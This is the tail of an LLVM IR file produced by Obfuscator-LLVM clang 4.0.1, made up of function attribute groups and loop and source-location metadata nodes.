attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { nounwind readonly }
attributes #15 = { nounwind returns_twice }
attributes #16 = { noreturn nounwind }
attributes #17 = { nounwind readnone }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = !{!5}
!5 = distinct !{!5, !6}
!6 = distinct !{!6, !"LVerDomain"}
!7 = !{!8}
!8 = distinct !{!8, !6}
!9 = distinct !{!9, !10}
!10 = !{!"llvm.loop.unroll.disable"}
!11 = distinct !{!11, !2, !3}
!12 = distinct !{!12, !2, !3}
!13 = !{i32 -2146623954}
!14 = !{i32 -2146622514}
!15 = !{i32 -2146621691}
!16 = distinct !{!16, !2, !3}
!17 = distinct !{!17, !18, !2, !3}
!18 = !{!"llvm.loop.unroll.runtime.disable"}
!19 = !{i32 -2146620881}
!20 = !{i32 -2146619630}
